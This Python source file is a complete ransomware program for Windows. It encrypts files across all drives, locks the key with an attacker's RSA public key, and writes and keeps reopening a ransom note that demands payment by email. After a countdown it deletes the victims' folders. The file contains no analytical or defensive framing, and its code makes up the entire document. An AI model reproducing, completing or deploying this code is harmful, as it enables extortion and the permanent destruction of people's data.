import os
import time
import time
import queue
import ctypes
import shutil
import win32gui
import platform
import pyfiglet
import threading
import subprocess
import urllib.request
import countdowntimer
from datetime import date
from datetime import date
from ctypes import wintypes
from termcolor import colored
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding

shell32 = ctypes.windll.shell32
global desktop_path
desktop_path = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
shell32.SHGetFolderPathW(0, 0x0000, 0, 0, desktop_path)
desktop_path = desktop_path.value
global allowed_extensions
allowed_extensions = ['.sql', '.mp4', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.zip', '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic', '.bkf', '.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup', '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mov', '.vdf', '.ztmp', '.sis', '.sid', '.ncf', '.menu', '.layout', '.dmp', '.blob', '.esm', '.vcf', '.vtf', '.dazip', '.fpk', '.mlx', '.kf', '.iwd', '.vpk', '.tor', '.psk', '.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff', '.vpp_pc', '.lrf', '.m2', '.mcmeta', '.vfs0', '.mpqge', '.kdb', '.db0', '.dba', '.rofl', '.hkx', '.bar', '.upk', '.das', '.iwi', '.litemod', '.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav', '.lbf', '.slm', '.bik', '.epk', '.rgss3a', '.pak', '.big', 'wallet', '.wotreplay', '.xxx', '.desc', '.py', '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg', '.txt', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer', '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2', '.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref', '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay', '.sr2', '.srf', '.arw', '.3fr', '.dng', '.jpe', '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd', '.dbf', '.mdf', '.wb2', '.rtf', '.wpd', '.dxg', '.xf', '.dwg', '.pst', '.accdb', '.mdb', '.pptm', '.pptx', '.ppt', '.xlk', '.xlsb', '.xlsm', '.xlsx', '.xls', '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods', '.odt', '.exe', '.heic']
global message_queue
message_queue = queue.Queue()

def delete_folders(folders):
    print(folders)
    while True:
        time.sleep(5)
        timeremaining = countdowntimer.read_remaining_time() 
        print('current time is : ', timeremaining)
        if timeremaining <= 0:
            print(folders)
            print("Deleting folders...")
            time.sleep(10)
            for folder in folders:
                try:
                    shutil.rmtree(folder)
                except Exception as e:
                    print(str(e))
            os._exit(1)
            break
        else:
            pass

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    cipher = Fernet(key)
    try:
        with open(file_path, 'rb') as file:
            data = file.read()
            encrypted_data = cipher.encrypt(data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
    except:
        pass

def decrypt_file(file_path, key):
    cipher = Fernet(key)
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
            decrypted_data = cipher.decrypt(encrypted_data)
        with open(file_path, 'wb') as file:
            file.write(decrypted_data)
    except:
        pass

def encrypt_folders(folders, key):
    for folder in folders:
        for root, dirs, files in os.walk(folder):
            if 'Desktop' not in root and 'AppData' not in root and 'Windows' not in root and 'desktop' not in root:
                for file in files:
                    file_path = os.path.join(root, file)
                    file_extension = os.path.splitext(file_path)[1].lower()
                    if file_extension in allowed_extensions:
                        try:
                            encrypt_file(file_path, key)
                        except Exception as e:
                            pass

def decrypt_folders(folders, key):
    for folder in folders:
        for root, dirs, files in os.walk(folder):
            if 'Desktop' not in root and 'AppData' not in root and 'Windows' not in root and 'desktop' not in root:
                for file in files:
                    file_path = os.path.join(root, file)
                    file_extension = os.path.splitext(file_path)[1].lower()
                    if file_extension in allowed_extensions:
                        try:
                            decrypt_file(file_path, key)
                        except:
                            pass

def change_desktop_background(image_url, desktop_path):
    image_path = os.path.join(desktop_path, 'background.jpg')
    urllib.request.urlretrieve(image_url, image_path)
    if platform.system() == 'Windows':
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)


def create_ransom_note(desktop_path):
    ransom_note_path = os.path.join(desktop_path, 'RANSOM_NOTE.txt')
    today = date.today().strftime('%d-%B-%Y')
    ransom_note_content = f'''
The hard disks of your computer have been encrypted with a military-grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!
{today}
To purchase your key and restore your data, please follow these easy steps:
1. Email the file called EMAIL_ME.txt at {desktop_path}/EMAIL_ME.txt to GetYourFilesBack@protonmail.com.
2. You will receive a text file with your KEY that will unlock all your files.
   IMPORTANT: To decrypt your files, place the text file on the desktop and wait. Shortly after, it will begin to decrypt all files.
WARNING:
- Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.
- Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files, and there is a high chance you will lose your files forever.
- Do NOT send the "PAID" button without paying; the price WILL go up for disobedience.
- Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay. WE WILL.
'''
    with open(ransom_note_path, 'w') as f:
        f.write(ransom_note_content)
    time.sleep(2)
    ransom = subprocess.Popen(['notepad.exe', os.path.join(desktop_path, 'RANSOM_NOTE.txt')])
    return ransom

def show_ransom_note():
    ransom = create_ransom_note(desktop_path)
    while True:
        time.sleep(5)
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if top_window == 'RANSOM_NOTE - Notepad':
            pass
        else:
            time.sleep(0.1)
            ransom.kill()
            time.sleep(0.1)
            ransom = create_ransom_note(desktop_path)
def get_available_drives():
    drives = []
    if platform.system() == 'Windows':
        import win32api
        bitmask = win32api.GetLogicalDrives()
        for letter in range(65, 91):
            if bitmask & 1:
                drives.append(chr(letter) + ':\\')
            bitmask >>= 1
    elif platform.system() == 'Linux':
        with open('/proc/mounts', 'r') as f:
            lines = f.readlines()
            for line in lines:
                if line.startswith('/dev/'):
                    drive = line.split(' ')[1]
                    drives.append(drive)
    return drives

def get_folders_to_encrypt(drives, desktop_path):
    folders = []
    for drive in drives:
        if drive != 'C:\\':
            folders.append(drive)
        else:
            program_files_folder = os.path.join(drive, 'Program Files')
            program_files_x86_folder = os.path.join(drive, 'Program Files (x86)')
            folders.append(program_files_folder)
            folders.append(program_files_x86_folder)
            CDrive = os.path.join(drive)
            for root, dirs, files in os.walk(CDrive):
                if 'Desktop' not in root and 'AppData' not in root and 'Windows' not in root and 'desktop' not in root and 'python' not in root and 'Python' not in root:
                    folders.append(root)
                elif desktop_path in root:
                    dirs[:] = []
    return folders

def encrypt_key_with_public_key(key):
    public_key = '''generate public key from attackerkeys.py file and copy/paste public key here'''

    public_key = serialization.load_pem_public_key(
        public_key.encode(),
        backend=default_backend()
    )

    encrypted_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_key_file = os.path.join(desktop_path, 'email.txt')
    with open(encrypted_key_file, 'wb') as file:
        file.write(encrypted_key)
    return encrypted_key

def wait_for_decrypted_key():
    decrypted_key_file = os.path.join(desktop_path, 'putmeondesktop.txt')
    while True:
        time.sleep(10)
        if os.path.exists(decrypted_key_file):
            print('found the key,, decrypting...')
            with open(decrypted_key_file, 'rb') as file:
                decrypted_key = file.read()
                try:
                    decrypt_folders(folders=folders, key=decrypted_key)
                    break
                except Exception as e:
                    pass
        else:
            pass
    os._exit(1)

def main():
    print('DO NOT attempt to close terminal, All your files have been encrypted and deleting this window will just ruin your chances of ever getting your files back. A note will open shortly which will contain the instructions on how to get your files back, Follow it properly or FORGET your files.')
    drives = get_available_drives()
    global folders
    folders = drives
    thread1 = threading.Thread(target=show_ransom_note)
    thread2 = threading.Thread(target=countdowntimer.show_countdown_window)
    thread3 = threading.Thread(target=wait_for_decrypted_key)
    thread4 = threading.Thread(target=delete_folders, args=(folders,))
    
    key = generate_key()
    encrypt_key_with_public_key(key)
    encrypt_folders(folders=folders, key=key)
    time.sleep(5)
    thread1.start()
    thread2.start()
    thread4.start()
    thread3.start()

if __name__ == "__main__":
    main()
